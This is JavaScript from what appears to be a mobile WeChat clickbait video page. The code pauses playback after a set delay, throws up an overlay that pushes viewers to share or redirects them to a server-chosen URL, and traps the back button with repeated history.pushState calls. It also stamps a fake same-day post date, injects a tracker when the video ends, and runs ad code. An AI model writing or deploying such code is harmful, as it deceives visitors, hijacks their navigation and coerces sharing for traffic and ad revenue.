    //233333
    if (getCookie('delaytime') == null) {
        if (tip == 'goon') {
            setCookie('delaytime', '9999');
        } else {
            setCookie('delaytime', sp_time);
        }
    }
    if (tip == 'ok') {
        setTimeout('jssdk()', 500);
    }
    var pageGlobal = {};
    hturl = '';
    pageGlobal.vid = sp_id;
    pageGlobal.playStatus = '';
    pageGlobal.delayTime = parseInt(getCookie('delaytime'));
    var video, player;
    var vid = pageGlobal.vid;
    var playStatus = 'pending';
    new Swiper('.swiper-container', {
        autoplay: 5000
    }); 
    $(function() {
        var elId = 'mod_player_skin_0';
        $("#js_content").html('<div id="' + elId + '" class="player_skin" style="padding-top:6px;"></div>');
        var elWidth = $("#js_content").width();
        playVideo(vid, elId, elWidth);
        $("#pauseplay").height($("#js_content").height() - 10);
        if (playStatus == 'pending') {
            var delayTime = pageGlobal.delayTime;
            var isFirst = true;
            setInterval(function() {
                try {
                    var currentTime = player.getCurTime();
                    if (currentTime >= delayTime) {
                        $('#pauseplay').show();
                        player.callCBEvent('pause');
                        $.cookie(vid, 's', {
                            path: '/'
                        });
                        if (isFirst) {
                            $('#pauseplay').trigger('click');
                        }
                        isFirst = false;
                    }
                } catch (e) {}
            }, 500);
        }
        var h = $('#scroll').height();
        $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
        new IScroll('#wrapper', {
            useTransform: false,
            click: true
        });
        setTimeout(function() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
        }, 200);
    });

    function playVideo(vid, elId, elWidth) {
        //定义视频对象
        video = new tvp.VideoInfo();
        //向视频对象传入视频vid
        video.setVid(vid);
        //定义播放器对象
        player = new tvp.Player(elWidth, 200);
        //设置播放器初始化时加载的视频
        player.setCurVideo(video);
        //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
        //player.addParam("autoplay","1"); 
        player.addParam("wmode", "transparent");
        player.addParam("pic", tvp.common.getVideoSnapMobile(vid));
        player.onallended = function(){
            var _hmt = _hmt || [];
            (function() {
                var hm = document.createElement("script");
                hm.src = "https://hm.baidu.com/hm.js?cf8f2b36a32f96659553a95c3edbc206";
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(hm, s);
            })();
            setTimeout(function(){
                
//            location.href="http://t.cn/EL6wUZ8"
               ggcash('fanhui')
            }, 2000);	
            
        }
        player.write(elId);
     //   playerid()
    }
    $('#pauseplay').on('click', function() {
        setCookie('xxxooo', '1');
        $.post(apidomain, {
            index: 'ok'
        }, function(res) {
            console.log(res);
            location.href = res.url;
        }, 'JSON');
    });
    $('#like').on('click', function() {
        var $icon = $(this).find('i');
        var $num = $(this).find('#likeNum');
        var num = 0;
        if (!$icon.hasClass('praised')) {
            num = parseInt($num.html());
            if (isNaN(num)) {
                num = 0;
            }
            $num.html(++num);
            $icon.addClass("praised");
        } else {
            num = parseInt($num.html());
            num--;
            if (isNaN(num)) {
                num = 0;
            }
            $num.html(num);
            $icon.removeClass("praised");
        }
    });


    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function playerid()
    {
        try {
            var dom = document.getElementById(player.playerid)
            dom.setAttribute("playsinline","")
            dom.setAttribute("webkit-playsinline","")
            dom.setAttribute("x5-playsinline","")
            dom.setAttribute("controls","")
        } catch (e){
            setTimeout(function(){
                window.playerid()
            },100)
        }
    }

    function jump(url) {
        var a = document.createElement('a');
        a.setAttribute('rel', 'noreferrer');
        a.setAttribute('id', 'm_noreferrer');
        a.setAttribute('href', url);
        document.body.appendChild(a);
        document.getElementById('m_noreferrer').click();
        document.body.removeChild(a);
    }

    function jssdk() {
        $("#mask").css("height", $(document).height());
        $("#mask").css("width", $(document).width());
        $("#mask").show();
        $("#fenxiang").show();
        $('#game_result').hide();
        $('.time-out-num').hide();
        $('.bag').hide();
        show_tip();
    }
    // $.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js', function() {
    //     diqu = remote_ip_info.city;
    // });
    (function() {
        /**
         * 动态加载js文件
         * @param  {string}   url      js文件的url地址
         * @param  {Function} callback 加载完成后的回调函数
         */
        var _getScript = function(url, callback) {
            var head = document.getElementsByTagName('head')[0],
                js = document.createElement('script');
            js.setAttribute('type', 'text/javascript');
            js.setAttribute('src', url);
            head.appendChild(js);
            //执行回调
            var callbackFn = function() {
                if (typeof callback === 'function') {
                    callback();
                }
            };
            if (document.all) { //IE
                js.onreadystatechange = function() {
                    if (js.readyState == 'loaded' || js.readyState == 'complete') {
                        callbackFn();
                    }
                }
            } else {
                js.onload = function() {
                    callbackFn();
                }
            }
        }
        //如果使用的是zepto，就添加扩展函数
        if (Zepto) {
            $.getScript = _getScript;
        }
    })();
    $(function() {
        $('#fenxiang').on('click', function() {
            show_tip()
        });
        $('#mask').on('click', function() {
            show_tip()
        })
    });

    function anchor() {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime())
    }
    setTimeout('anchor()', 100);
    var d = new Date();
    var str = d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
    document.getElementById("post-date").innerHTML = str;
    document.title = likeAndview['view'];
    document.getElementsByTagName('h2')[0].innerHTML = unescape(sp_title);
    if (getQueryString('hd') == 'ok') {
        setCookie('hd', 'ok');
    }

	function hideShare() {
        // 隐藏分享按钮
        function hide () {
            try {
                wx.hideOptionMenu();
                wx.hideAllNonBaseMenuItem();
            } catch (e) {}
        }

        try {
            wx.config({
                jsApiList: [
                    'hideOptionMenu',
                    'hideAllNonBaseMenuItem',
                ]
            });
            wx.ready(function () {
                console.log('ready');
                hide();
            })
        } catch (e) {}
    };
    // 执行广告开关
    adimg();

	if(tip === 'ok'){
        // 执行wxconfig
        wxconfig();
    }else{
        // 隐藏分享按钮
        hideShare();
    }

    // 执行wxconfig
    //wxconfig()
